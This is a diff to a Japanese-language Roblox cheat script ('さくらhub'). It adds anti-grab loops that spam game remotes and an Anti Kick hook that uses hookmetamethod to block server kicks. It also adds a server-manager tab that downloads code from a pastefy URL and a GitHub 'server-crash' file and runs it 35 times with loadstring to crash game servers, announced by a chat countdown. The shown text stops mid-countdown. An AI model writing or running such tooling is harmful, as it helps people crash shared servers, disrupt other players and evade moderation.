@@ -1,5 +1,5 @@
 -- ============================================================================
--- 🌸さくらhubV0.7🌸 (v0.7.2.140)
+-- 🌸さくらhubV0.7[JP]🌸 (v0.7.2.140)
 -- ============================================================================
 
 -- ============================================================================
@@ -117,11 +117,11 @@ do
     local Theme = _G.Theme
 
     local Window = OrionLib:MakeWindow({
-        Name = "🌸さくらhubV0.7🌸",
+        Name = "🌸さくらhubV0.7[JP]🌸",
         HidePremium = false,
         SaveConfig = false,
         IntroEnabled = true,
-        IntroText = "🌸さくらhubV0.7🌸 読み込み中...",
+        IntroText = "🌸さくらhubV0.7[JP]🌸 読み込み中...",
         ThemeColor = Theme.BackgroundColor,
         BackgroundColor = Theme.BackgroundColor,
         TextColor = Theme.TextColor
@@ -3120,299 +3120,466 @@ do
 end
 
 -- ============================================================================
--- ブロック30: アンチタブ
+-- ブロック30: アンチタブ（拡張アンチモジュール統合版）
 -- ============================================================================
 do
-    local Window = _G.Window
-    local OrionLib = _G.OrionLib
-    local LocalPlayer = _G.LocalPlayer
-    local RunService = _G.RunService
-    local ReplicatedStorage = _G.ReplicatedStorage
-    local Players = _G.Players
-    local Workspace = _G.Workspace
+local Window = _G.Window
+local OrionLib = _G.OrionLib
+local LocalPlayer = _G.LocalPlayer
+local RunService = _G.RunService
+local ReplicatedStorage = _G.ReplicatedStorage
+local Players = _G.Players
+local Workspace = _G.Workspace
+local AntiTab = Window:MakeTab({ Name = "アンチ", Icon = "rbxassetid://4483362458", PremiumOnly = false })
+ local RS = ReplicatedStorage
+ local GE = RS:FindFirstChild("GrabEvents") or RS:WaitForChild("GrabEvents", 5)
+ local SetNetworkOwner = GE and GE:FindFirstChild("SetNetworkOwner")
+ local DestroyGrabLine = GE and GE:FindFirstChild("DestroyGrabLine")
+ local StruggleEvent = RS:FindFirstChild("CharacterEvents") and RS.CharacterEvents:FindFirstChild("Struggle")
+ local RagdollRemote = RS:FindFirstChild("CharacterEvents") and RS.CharacterEvents:FindFirstChild("RagdollRemote")
+ local SpawnToyRemote = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
+ local DestroyToy = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
+ local isHeldValue = LocalPlayer:FindFirstChild("IsHeld") or LocalPlayer:WaitForChild("IsHeld", 5)
 
-    local AntiTab = Window:MakeTab({ Name = "アンチ", Icon = "rbxassetid://4483362458", PremiumOnly = false })
+-- ========================================================================
+-- 既存防衛機能
+-- ========================================================================
+ AntiTab:AddSection({ Name = "防衛機能" })
+ local AntiGrabEnabled = false
+ AntiTab:AddToggle({
+     Name = "掴まれても脱出 (シンプル)",
+     Default = false,
+     Callback = function(Value)
+         AntiGrabEnabled = Value
+         if Value then PlayActionSound() end
+     end
+ })
+ RunService.Heartbeat:Connect(function()
+     if not AntiGrabEnabled then return end
+     local character = LocalPlayer.Character
+     if not character then return end
+     local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+     if not humanoidRootPart then return end
+     if isHeldValue and isHeldValue.Value == true then
+         pcall(function()
+             if StruggleEvent then StruggleEvent:FireServer(LocalPlayer) end
+         end)
+         humanoidRootPart.Velocity = Vector3.new()
+         humanoidRootPart.Anchored = true
+     else
+         humanoidRootPart.Anchored = false
+     end
+ end)
 
-    local RS = ReplicatedStorage
-    local GE = RS:FindFirstChild("GrabEvents") or RS:WaitForChild("GrabEvents", 5)
-    local SetNetworkOwner = GE and GE:FindFirstChild("SetNetworkOwner")
-    local DestroyGrabLine = GE and GE:FindFirstChild("DestroyGrabLine")
-    local StruggleEvent = RS:FindFirstChild("CharacterEvents") and RS.CharacterEvents:FindFirstChild("Struggle")
-    local RagdollRemote = RS:FindFirstChild("CharacterEvents") and RS.CharacterEvents:FindFirstChild("RagdollRemote")
-    local SpawnToyRemote = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
-    local DestroyToy = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
-    local isHeldValue = LocalPlayer:FindFirstChild("IsHeld") or LocalPlayer:WaitForChild("IsHeld", 5)
+ local antiGrabV2Enabled = false
+ local heldConnectionV2 = nil
+ local function StopAntiGrabV2()
+     antiGrabV2Enabled = false
+     if heldConnectionV2 then heldConnectionV2:Disconnect() heldConnectionV2 = nil end
+     local Root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+     if Root then Root.Anchored = false end
+ end
+ local function StartAntiGrabV2()
+     if heldConnectionV2 then heldConnectionV2:Disconnect() end
+     local isHeld = LocalPlayer:FindFirstChild("IsHeld")
+     if not isHeld then return end
+     heldConnectionV2 = isHeld:GetPropertyChangedSignal("Value"):Connect(function()
+         if not antiGrabV2Enabled or not isHeld.Value then return end
+         local Char = LocalPlayer.Character
+         if not Char then return end
+         local Root = Char:FindFirstChild("HumanoidRootPart")
+         local Hum = Char:FindFirstChildOfClass("Humanoid")
+         if not (Root and Hum) then return end
+         for _, part in pairs(Char:GetDescendants()) do 
+             if part:IsA("BasePart") then part.CanCollide = false end 
+         end
+         task.spawn(function()
+             while antiGrabV2Enabled and isHeld.Value do
+                 pcall(function()
+                     if StruggleEvent then StruggleEvent:FireServer() end
+                     if RagdollRemote then RagdollRemote:FireServer(Root, 0) end
+                     if SetNetworkOwner then SetNetworkOwner:FireServer(Root, Root.CFrame) end
+                 end)
+                 task.wait(0.03)
+             end
+         end)
+         task.spawn(function()
+             while antiGrabV2Enabled and isHeld.Value do
+                 pcall(function()
+                     Hum.Sit = false
+                     Hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+                     Hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+                     if Root then
+                         Root.Anchored = true
+                         Root.AssemblyLinearVelocity = Vector3.zero
+                         Root.AssemblyAngularVelocity = Vector3.zero
+                     end
+                 end)
+                 task.wait(0.03)
+             end
+             if Root then Root.Anchored = false end
+         end)
+     end)
+     if isHeld.Value then
+         local Char = LocalPlayer.Character
+         local Root = Char and Char:FindFirstChild("HumanoidRootPart")
+         if Root then Root.Anchored = true end
+         task.spawn(function()
+             while antiGrabV2Enabled and isHeld.Value do
+                 if StruggleEvent then StruggleEvent:FireServer() end
+                 task.wait(0.05)
+             end
+             if Root then Root.Anchored = false end
+         end)
+     end
+ end
+ AntiTab:AddToggle({
+     Name = "Anti Grab V2 (強化)",
+     Default = false,
+     Callback = function(Value)
+         antiGrabV2Enabled = Value
+         if Value then
+             PlayActionSound()
+             StartAntiGrabV2()
+             OrionLib:MakeNotification({ Name = "Anti Grab V2", Content = "有効化されました", Time = 3 })
+         else
+             StopAntiGrabV2()
+             OrionLib:MakeNotification({ Name = "Anti Grab V2", Content = "無効化されました", Time = 3 })
+         end
+     end
+ })
+ LocalPlayer.CharacterAdded:Connect(function(char)
+     task.wait(1)
+     if antiGrabV2Enabled then StartAntiGrabV2() end
+ end)
+ AntiTab:AddParagraph("説明", 
+     "掴まれても脱出(シンプル): Struggle連打 + アンカー\n" ..
+     "Anti Grab V2(強化): コリジョンオフ + Ragdoll解除 + 物理ロック"
+ )
 
-    AntiTab:AddSection({ Name = "防衛機能" })
+-- ========================================================================
+-- Anti Gucci（既存）
+-- ========================================================================
+ AntiTab:AddSection({ Name = "Anti Gucci" })
+ local autoGucciActive = false
+ local autoGucciConn = nil
+ local autoGucciSpamTask = nil
+ local function cleanupGucciTasks()
+     if autoGucciSpamTask then
+         task.cancel(autoGucciSpamTask)
+         autoGucciSpamTask = nil
+     end
+ end
+ local function SpawnGucciToy(toyName, hrp)
+     if not SpawnToyRemote then return nil end
+     local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
+     if not inv then return nil end
+     local spawnCF = hrp.CFrame * CFrame.new(0, 14, 20)
+     task.spawn(function()
+         pcall(function() SpawnToyRemote:InvokeServer(toyName, spawnCF, Vector3.zero) end)
+     end)
+     local t = tick()
+     local spawnedToy = nil
+     repeat
+         task.wait(0.1)
+         spawnedToy = inv:FindFirstChild(toyName)
+     until spawnedToy or (tick() - t > 3)
+     return spawnedToy
+ end
+ local function StartGucci()
+     if autoGucciConn then autoGucciConn:Disconnect() end
+     local GucciThing = nil
+     local isActive = false
+     local function gucci()
+         if not autoGucciActive then return end
+         isActive = true
+         local char = LocalPlayer.Character
+         if not char then isActive = false return end
+         local hrp = char:FindFirstChild("HumanoidRootPart")
+         local hum = char:FindFirstChild("Humanoid")
+         local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
+         if not (hrp and hum and inv) then isActive = false return end
+         cleanupGucciTasks()
+         if DestroyToy then
+             for _, v in pairs(inv:GetChildren()) do
+                 if v.Name == "AutoGucci" or v.Name == "TractorGreen" then
+                     pcall(function() DestroyToy:FireServer(v) end)
+                 end
+             end
+         end
+         local isHeld = LocalPlayer:FindFirstChild("IsHeld")
+         while isHeld and isHeld.Value do task.wait() end
+         hum.Sit = false
+         task.wait(0.1)
+         GucciThing = SpawnGucciToy("TractorGreen", hrp)
+         while not GucciThing and autoGucciActive do
+             task.wait(0.25)
+             GucciThing = SpawnGucciToy("TractorGreen", hrp)
+         end
+         if not GucciThing then isActive = false return end
+         GucciThing.Name = "AutoGucci"
+         local seat = GucciThing:FindFirstChild("VehicleSeat")
+         if not seat then isActive = false return end
+         autoGucciSpamTask = task.spawn(function()
+             while isActive and autoGucciActive do
+                 if RagdollRemote then pcall(function() RagdollRemote:FireServer(hrp, 0) end) end
+                 if StruggleEvent then pcall(function() StruggleEvent:FireServer(LocalPlayer) end) end
+                 task.wait(0.05)
+             end
+         end)
+         local t0 = tick()
+         while not hum.SeatPart and autoGucciActive and tick() - t0 < 3 do
+             seat:Sit(hum)
+             task.wait(0.1)
+         end
+         hum.Sit = false
+         hum:ChangeState(Enum.HumanoidStateType.Jumping)
+         hrp.Anchored = true
+         task.spawn(function()
+             task.wait(0.3)
+             GucciThing:PivotTo(CFrame.new(0, 1e6, 0))
+             for _, p in pairs(GucciThing:GetDescendants()) do
+                 if p:IsA("BasePart") then p.Anchored = true end
+             end
+         end)
+         hrp.Anchored = false
+         isActive = false
+     end
+     gucci()
+     autoGucciConn = RunService.Heartbeat:Connect(function()
+         if not autoGucciActive then return end
+         if isActive then return end
+         local char = LocalPlayer.Character
+         local hrp = char and char:FindFirstChild("HumanoidRootPart")
+         local hum = char and char:FindFirstChild("Humanoid")
+         local isHeld = LocalPlayer:FindFirstChild("IsHeld")
+         if not (hrp and hum) or hum.Health <= 0 then
+             isActive = true
+             LocalPlayer.CharacterAdded:Wait()
+             task.wait(0.5)
+             gucci()
+             return
+         end
+         if (isHeld and isHeld.Value) or hum.Sit then gucci() end
+     end)
+ end
+ AntiTab:AddToggle({
+     Name = "Anti Gucci",
+     Default = false,
+     Callback = function(Value)
+         autoGucciActive = Value
+         if Value then
+             PlayActionSound()
+             StartGucci()
+             OrionLib:MakeNotification({ Name = "Anti Gucci", Content = "有効化されました", Time = 3 })
+         else
+             cleanupGucciTasks()
+             if autoGucciConn then autoGucciConn:Disconnect() autoGucciConn = nil end
+             local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
+             if inv and DestroyToy then
+                 for _, v in pairs(inv:GetChildren()) do
+                     if v.Name == "AutoGucci" or v.Name == "TractorGreen" then
+                         pcall(function() DestroyToy:FireServer(v) end)
+                     end
+                 end
+             end
+             OrionLib:MakeNotification({ Name = "Anti Gucci", Content = "無効化されました", Time = 3 })
+         end
+     end
+ })
 
-    local AntiGrabEnabled = false
-    AntiTab:AddToggle({
-        Name = "掴まれても脱出 (シンプル)",
-        Default = false,
-        Callback = function(Value)
-            AntiGrabEnabled = Value
-            if Value then PlayActionSound() end
-        end
-    })
+-- ========================================================================
+-- Anti Void（既存）
+-- ========================================================================
+ AntiTab:AddSection({ Name = "Anti Void" })
+ AntiTab:AddToggle({
+     Name = "Anti Void",
+     Default = false,
+     Callback = function(Value)
+         if Value then
+             PlayActionSound()
+             Workspace.FallenPartsDestroyHeight = 0/0
+             OrionLib:MakeNotification({ Name = "Anti Void", Content = "有効化されました", Time = 3 })
+         else
+             Workspace.FallenPartsDestroyHeight = -100
+             OrionLib:MakeNotification({ Name = "Anti Void", Content = "無効化されました", Time = 3 })
+         end
+     end
+ })
+ AntiTab:AddParagraph("注意", "Anti Voidはボイド落下を防ぎます")
 
-    RunService.Heartbeat:Connect(function()
-        if not AntiGrabEnabled then return end
-        local character = LocalPlayer.Character
-        if not character then return end
-        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-        if not humanoidRootPart then return end
-        if isHeldValue and isHeldValue.Value == true then
-            pcall(function()
-                if StruggleEvent then StruggleEvent:FireServer(LocalPlayer) end
-            end)
-            humanoidRootPart.Velocity = Vector3.new()
-            humanoidRootPart.Anchored = true
-        else
-            humanoidRootPart.Anchored = false
-        end
-    end)
+-- ========================================================================
+-- 拡張防衛機能（新規追加）
+-- ========================================================================
+ AntiTab:AddSection({ Name = "拡張防衛機能" })
 
-    local antiGrabV2Enabled = false
-    local heldConnectionV2 = nil
+ -- ====================================================================
+ -- Anti Enemy Blobman
+ -- 機構: 他プレイヤーのCreatureBlobman検出 → DetectorのCanTouch無効化
+ -- ====================================================================
+ local AntiEnemyBlobmanState = { Enabled = false, Connection = nil }
 
-    local function StopAntiGrabV2()
-        antiGrabV2Enabled = false
-        if heldConnectionV2 then heldConnectionV2:Disconnect() heldConnectionV2 = nil end
-        local Root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if Root then Root.Anchored = false end
-    end
+ local function neutralizeEnemyBlobman(blobman)
+     -- 自分のBlobmanは除外
+     local ownerVal = blobman:FindFirstChild("PlayerValue")
+     if ownerVal then
+         local ownerValue = ownerVal.Value
+         if ownerValue == LocalPlayer.Name or ownerValue == tostring(LocalPlayer.UserId) then
+             return
+         end
+     end
+     -- PlotSign経由のオーナー確認（フォールバック）
+     local plotSign = blobman:FindFirstChild("PlotSign")
+     if plotSign then
+         local ownerObj = plotSign:FindFirstChild("Owner")
+         if ownerObj and ownerObj.Value == LocalPlayer.Name then return end
+     end
+     -- SpawnedInToysフォルダ経由のオーナー確認
+     local parent = blobman.Parent
+     if parent and parent.Name == (LocalPlayer.Name .. "SpawnedInToys") then return end
 
-    local function StartAntiGrabV2()
-        if heldConnectionV2 then heldConnectionV2:Disconnect() end
-        local isHeld = LocalPlayer:FindFirstChild("IsHeld")
-        if not isHeld then return end
-        heldConnectionV2 = isHeld:GetPropertyChangedSignal("Value"):Connect(function()
-            if not antiGrabV2Enabled or not isHeld.Value then return end
-            local Char = LocalPlayer.Character
-            if not Char then return end
-            local Root = Char:FindFirstChild("HumanoidRootPart")
-            local Hum = Char:FindFirstChildOfClass("Humanoid")
-            if not (Root and Hum) then return end
-            for _, part in pairs(Char:GetDescendants()) do 
-                if part:IsA("BasePart") then part.CanCollide = false end 
-            end
-            task.spawn(function()
-                while antiGrabV2Enabled and isHeld.Value do
-                    pcall(function()
-                        if StruggleEvent then StruggleEvent:FireServer() end
-                        if RagdollRemote then RagdollRemote:FireServer(Root, 0) end
-                        if SetNetworkOwner then SetNetworkOwner:FireServer(Root, Root.CFrame) end
-                    end)
-                    task.wait(0.03)
-                end
-            end)
-            task.spawn(function()
-                while antiGrabV2Enabled and isHeld.Value do
-                    pcall(function()
-                        Hum.Sit = false
-                        Hum:ChangeState(Enum.HumanoidStateType.GettingUp)
-                        Hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
-                        if Root then
-                            Root.Anchored = true
-                            Root.AssemblyLinearVelocity = Vector3.zero
-                            Root.AssemblyAngularVelocity = Vector3.zero
-                        end
-                    end)
-                    task.wait(0.03)
-                end
-                if Root then Root.Anchored = false end
-            end)
-        end)
-        if isHeld.Value then
-            local Char = LocalPlayer.Character
-            local Root = Char and Char:FindFirstChild("HumanoidRootPart")
-            if Root then Root.Anchored = true end
-            task.spawn(function()
-                while antiGrabV2Enabled and isHeld.Value do
-                    if StruggleEvent then StruggleEvent:FireServer() end
-                    task.wait(0.05)
-                end
-                if Root then Root.Anchored = false end
-            end)
-        end
-    end
+     -- LeftDetector / RightDetector の CanTouch を無効化
+     for _, side in ipairs({"Left", "Right"}) do
+         local detector = blobman:FindFirstChild(side .. "Detector")
+         if detector and detector:IsA("BasePart") then
+             pcall(function() detector.CanTouch = false end)
+         end
+     end
+ end
 
-    AntiTab:AddToggle({
-        Name = "Anti Grab V2 (強化)",
-        Default = false,
-        Callback = function(Value)
-            antiGrabV2Enabled = Value
-            if Value then
-                PlayActionSound()
-                StartAntiGrabV2()
-                OrionLib:MakeNotification({ Name = "Anti Grab V2", Content = "有効化されました", Time = 3 })
-            else
-                StopAntiGrabV2()
-                OrionLib:MakeNotification({ Name = "Anti Grab V2", Content = "無効化されました", Time = 3 })
-            end
-        end
-    })
+ local function StartAntiEnemyBlobman()
+     if AntiEnemyBlobmanState.Connection then return end
+     -- 既存のBlobmanを走査
+     for _, obj in ipairs(Workspace:GetDescendants()) do
+         if obj:IsA("Model") and obj.Name == "CreatureBlobman" then
+             neutralizeEnemyBlobman(obj)
+         end
+     end
+     -- 新規スポーン監視
+     AntiEnemyBlobmanState.Connection = Workspace.DescendantAdded:Connect(function(desc)
+         if desc:IsA("Model") and desc.Name == "CreatureBlobman" then
+             task.defer(function()
+                 if AntiEnemyBlobmanState.Enabled then
+                     neutralizeEnemyBlobman(desc)
+                 end
+             end)
+         end
+     end)
+ end
 
-    LocalPlayer.CharacterAdded:Connect(function(char)
-        task.wait(1)
-        if antiGrabV2Enabled then StartAntiGrabV2() end
-    end)
+ local function StopAntiEnemyBlobman()
+     if AntiEnemyBlobmanState.Connection then
+         AntiEnemyBlobmanState.Connection:Disconnect()
+         AntiEnemyBlobmanState.Connection = nil
+     end
+ end
 
-    AntiTab:AddParagraph("説明", 
-        "掴まれても脱出(シンプル): Struggle連打 + アンカー\n" ..
-        "Anti Grab V2(強化): コリジョンオフ + Ragdoll解除 + 物理ロック"
-    )
+ AntiTab:AddToggle({
+     Name = "Anti Enemy Blobman (敵ブロブ無効化)",
+     Default = false,
+     Callback = function(Value)
+         AntiEnemyBlobmanState.Enabled = Value
+         if Value then
+             PlayActionSound()
+             StartAntiEnemyBlobman()
+             OrionLib:MakeNotification({
+                 Name = "Anti Enemy Blobman",
+                 Content = "有効化 - 敵のBlobmanのDetectorを無効化します",
+                 Time = 3
+             })
+         else
+             StopAntiEnemyBlobman()
+             OrionLib:MakeNotification({
+                 Name = "Anti Enemy Blobman",
+                 Content = "無効化されました",
+                 Time = 3
+             })
+         end
+     end
+ })
 
-    AntiTab:AddSection({ Name = "Anti Gucci" })
+ -- ====================================================================
+ -- Anti Kick
+ -- 機構: hookmetamethod で Player:Kick() を拦截
+ -- 非対応環境では自動無効化
+ -- ====================================================================
+ local AntiKickState = { Enabled = false, Hooked = false }
 
-    local autoGucciActive = false
-    local autoGucciConn = nil
-    local autoGucciSpamTask = nil
+ local function StartAntiKick()
+     if AntiKickState.Hooked then return end
+     -- エグゼキュータ依存チェック
+     if not hookmetamethod then
+         PlayErrorSound()
+         OrionLib:MakeNotification({
+             Name = "Anti Kick",
+             Content = "hookmetamethod が利用できません。このエグゼキュータでは使用不可です。",
+             Time = 5
+         })
+         AntiKickState.Enabled = false
+         return false
+     end
+     local oldNamecall
+     oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+         local method = getnamecallmethod()
+         if method == "Kick" and self == LocalPlayer then
+             return -- 呼び出し握り潰し
+         end
+         return oldNamecall(self, ...)
+     end)
+     AntiKickState.Hooked = true
+     return true
+ end
 
-    local function cleanupGucciTasks()
-        if autoGucciSpamTask then
-            task.cancel(autoGucciSpamTask)
-            autoGucciSpamTask = nil
-        end
-    end
+ local antiKickToggle = AntiTab:AddToggle({
+     Name = "Anti Kick (サーバーキック無効化)",
+     Default = false,
+     Callback = function(Value)
+         if Value then
+             PlayActionSound()
+             local success = StartAntiKick()
+             if success then
+                 AntiKickState.Enabled = true
+                 OrionLib:MakeNotification({
+                     Name = "Anti Kick",
+                     Content = "有効化 - Player:Kick() を拦截します",
+                     Time = 3
+                 })
+             else
+                 antiKickToggle:SetValue(false)
+             end
+         else
+             -- Anti Kick は一度フックしたら解除できないため警告のみ
+             AntiKickState.Enabled = false
+             PlayErrorSound()
+             OrionLib:MakeNotification({
+                 Name = "Anti Kick",
+                 Content = "注意: フックは解除できません。拦截自体は継続されます。",
+                 Time = 4
+             })
+         end
+     end
+ })
 
-    local function SpawnGucciToy(toyName, hrp)
-        if not SpawnToyRemote then return nil end
-        local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
-        if not inv then return nil end
-        local spawnCF = hrp.CFrame * CFrame.new(0, 14, 20)
-        task.spawn(function()
-            pcall(function() SpawnToyRemote:InvokeServer(toyName, spawnCF, Vector3.zero) end)
-        end)
-        local t = tick()
-        local spawnedToy = nil
-        repeat
-            task.wait(0.1)
-            spawnedToy = inv:FindFirstChild(toyName)
-        until spawnedToy or (tick() - t > 3)
-        return spawnedToy
-    end
+ AntiTab:AddParagraph("拡張防衛 説明", 
+     "Anti Enemy Blobman: 他プレイヤーのCreatureBlobmanの\n" ..
+     "LeftDetector/RightDetectorのCanTouchを無効化し、\n" ..
+     "敵に掴まれるのを防ぎます。\n\n" ..
+     "Anti Kick: hookmetamethodでPlayer:Kick()を拦截します。\n" ..
+     "一度有効化するとフックは解除できません。\n" ..
+     "hookmetamethod非対応エグゼキュータでは使用不可。"
+ )
 
-    local function StartGucci()
-        if autoGucciConn then autoGucciConn:Disconnect() end
-        local GucciThing = nil
-        local isActive = false
-        local function gucci()
-            if not autoGucciActive then return end
-            isActive = true
-            local char = LocalPlayer.Character
-            if not char then isActive = false return end
-            local hrp = char:FindFirstChild("HumanoidRootPart")
-            local hum = char:FindFirstChild("Humanoid")
-            local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
-            if not (hrp and hum and inv) then isActive = false return end
-            cleanupGucciTasks()
-            if DestroyToy then
-                for _, v in pairs(inv:GetChildren()) do
-                    if v.Name == "AutoGucci" or v.Name == "TractorGreen" then
-                        pcall(function() DestroyToy:FireServer(v) end)
-                    end
-                end
-            end
-            local isHeld = LocalPlayer:FindFirstChild("IsHeld")
-            while isHeld and isHeld.Value do task.wait() end
-            hum.Sit = false
-            task.wait(0.1)
-            GucciThing = SpawnGucciToy("TractorGreen", hrp)
-            while not GucciThing and autoGucciActive do
-                task.wait(0.25)
-                GucciThing = SpawnGucciToy("TractorGreen", hrp)
-            end
-            if not GucciThing then isActive = false return end
-            GucciThing.Name = "AutoGucci"
-            local seat = GucciThing:FindFirstChild("VehicleSeat")
-            if not seat then isActive = false return end
-            autoGucciSpamTask = task.spawn(function()
-                while isActive and autoGucciActive do
-                    if RagdollRemote then pcall(function() RagdollRemote:FireServer(hrp, 0) end) end
-                    if StruggleEvent then pcall(function() StruggleEvent:FireServer(LocalPlayer) end) end
-                    task.wait(0.05)
-                end
-            end)
-            local t0 = tick()
-            while not hum.SeatPart and autoGucciActive and tick() - t0 < 3 do
-                seat:Sit(hum)
-                task.wait(0.1)
-            end
-            hum.Sit = false
-            hum:ChangeState(Enum.HumanoidStateType.Jumping)
-            hrp.Anchored = true
-            task.spawn(function()
-                task.wait(0.3)
-                GucciThing:PivotTo(CFrame.new(0, 1e6, 0))
-                for _, p in pairs(GucciThing:GetDescendants()) do
-                    if p:IsA("BasePart") then p.Anchored = true end
-                end
-            end)
-            hrp.Anchored = false
-            isActive = false
-        end
-        gucci()
-        autoGucciConn = RunService.Heartbeat:Connect(function()
-            if not autoGucciActive then return end
-            if isActive then return end
-            local char = LocalPlayer.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-            local hum = char and char:FindFirstChild("Humanoid")
-            local isHeld = LocalPlayer:FindFirstChild("IsHeld")
-            if not (hrp and hum) or hum.Health <= 0 then
-                isActive = true
-                LocalPlayer.CharacterAdded:Wait()
-                task.wait(0.5)
-                gucci()
-                return
-            end
-            if (isHeld and isHeld.Value) or hum.Sit then gucci() end
-        end)
-    end
-
-    AntiTab:AddToggle({
-        Name = "Anti Gucci",
-        Default = false,
-        Callback = function(Value)
-            autoGucciActive = Value
-            if Value then
-                PlayActionSound()
-                StartGucci()
-                OrionLib:MakeNotification({ Name = "Anti Gucci", Content = "有効化されました", Time = 3 })
-            else
-                cleanupGucciTasks()
-                if autoGucciConn then autoGucciConn:Disconnect() autoGucciConn = nil end
-                local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
-                if inv and DestroyToy then
-                    for _, v in pairs(inv:GetChildren()) do
-                        if v.Name == "AutoGucci" or v.Name == "TractorGreen" then
-                            pcall(function() DestroyToy:FireServer(v) end)
-                        end
-                    end
-                end
-                OrionLib:MakeNotification({ Name = "Anti Gucci", Content = "無効化されました", Time = 3 })
-            end
-        end
-    })
-
-    AntiTab:AddSection({ Name = "Anti Void" })
-    AntiTab:AddToggle({
-        Name = "Anti Void",
-        Default = false,
-        Callback = function(Value)
-            if Value then
-                PlayActionSound()
-                Workspace.FallenPartsDestroyHeight = 0/0
-                OrionLib:MakeNotification({ Name = "Anti Void", Content = "有効化されました", Time = 3 })
-            else
-                Workspace.FallenPartsDestroyHeight = -100
-                OrionLib:MakeNotification({ Name = "Anti Void", Content = "無効化されました", Time = 3 })
-            end
-        end
-    })
-
-    AntiTab:AddParagraph("注意", "Anti Voidはボイド落下を防ぎます")
+-- ========================================================================
+-- グローバル登録（他モジュールからの呼び出し用）
+-- ========================================================================
+ _G.SakuraHubExtension = _G.SakuraHubExtension or {}
+ _G.SakuraHubExtension.AntiEnemyBlobman = function(state)
+     AntiEnemyBlobmanState.Enabled = state
+     if state then StartAntiEnemyBlobman() else StopAntiEnemyBlobman() end
+ end
+ _G.SakuraHubExtension.AntiKick = function(state)
+     if state then StartAntiKick() end
+ end
 end
 
 -- ============================================================================
@@ -4563,6 +4730,290 @@ do
 end
 
 -- ============================================================================
+-- ブロック31.5 [JP]: サーバーマネージャータブ（日本語版・完全版）
+-- 攻撃系タブ（ブロック31）の直後に挿入
+-- ============================================================================
+do
+    local Window = _G.Window
+    local OrionLib = _G.OrionLib
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TextChatService = game:GetService("TextChatService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+
+    -- ========================================================================
+    -- 定数
+    -- ========================================================================
+    local CRASH_URL     = "https://pastefy.app/sPciZuXM/raw"   -- クラッシュ単独（35回連続）
+    local AUTOLOGIC_URL = "https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/refs/heads/main/server-crash"   -- オート無限ループ用（自己完結）
+    local CHAT_HEADER   = "SakuraHUB-by-Nuked"
+    local CRASH_LOOP_COUNT = 35
+
+    -- ========================================================================
+    -- HTTP取得
+    -- ========================================================================
+    local function safeHttpGet(url)
+        if type(game.HttpGet) == "function" then
+            return game:HttpGet(url)
+        elseif type(HttpGet) == "function" then
+            return HttpGet(url)
+        elseif type(game.HttpGet) == "function" then
+            return game.HttpGet(game, url)
+        end
+        error("HttpGet not available in this environment")
+    end
+
+    -- ========================================================================
+    -- チャット送信（2方式：TextChatService + レガシー）
+    -- ========================================================================
+    local function sendChatMessage(message)
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            pcall(function()
+                local gc = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+                gc:SendAsync(message)
+            end)
+        end
+        local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if events then
+            local smr = events:FindFirstChild("SayMessageRequest")
+            if smr then
+                pcall(function() smr:FireServer(message, "All") end)
+            end
+        end
+    end
+
+    -- ========================================================================
+    -- クラッシュスクリプト実行（単独・35回）
+    -- ========================================================================
+    local function runCrashScript()
+        local ok, err = pcall(function()
+            local scriptContent = safeHttpGet(CRASH_URL)
+            for i = 1, CRASH_LOOP_COUNT do
+                pcall(function()
+                    loadstring(scriptContent)()
+                end)
+                task.wait(0.1)
+            end
+        end)
+        return ok, err
+    end
+
+    -- ========================================================================
+    -- 別サーバーJobId取得
+    -- ========================================================================
+    local function getAnotherServerJobId()
+        local ok, result = pcall(function()
+            local url = string.format(
+                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100",
+                game.PlaceId
+            )
+            return HttpService:JSONDecode(safeHttpGet(url))
+        end)
+        if ok and result and result.data then
+            local currentJobId = game.JobId
+            for _, server in ipairs(result.data) do
+                if server.id and server.id ~= currentJobId then
+                    return server.id
+                end
+            end
+        end
+        return nil
+    end
+
+    -- ========================================================================
+    -- テレポート
+    -- ========================================================================
+    local function teleportToAnotherServer()
+        local targetJobId = getAnotherServerJobId()
+        local localPlayer = Players.LocalPlayer
+        if targetJobId then
+            local ok = pcall(function()
+                local opts = Instance.new("TeleportOptions")
+                opts.ServerInstanceId = targetJobId
+                TeleportService:TeleportAsync(game.PlaceId, {localPlayer}, opts)
+            end)
+            if ok then return true end
+        end
+        pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
+        return false
+    end
+
+    -- ========================================================================
+    -- カウントダウン（1回分）
+    -- ========================================================================
+    local function runCountdownOnce(onFinish)
+        task.spawn(function()
+            pcall(function() sendChatMessage(CHAT_HEADER) end)
+            task.wait(0.8)
+            pcall(function() sendChatMessage("5") end) task.wait(1)
+            pcall(function() sendChatMessage("4") end) task.wait(1)
+            pcall(function() sendChatMessage("3") end) task.wait(1)
+            pcall(function() sendChatMessage("2") end) task.wait(1)
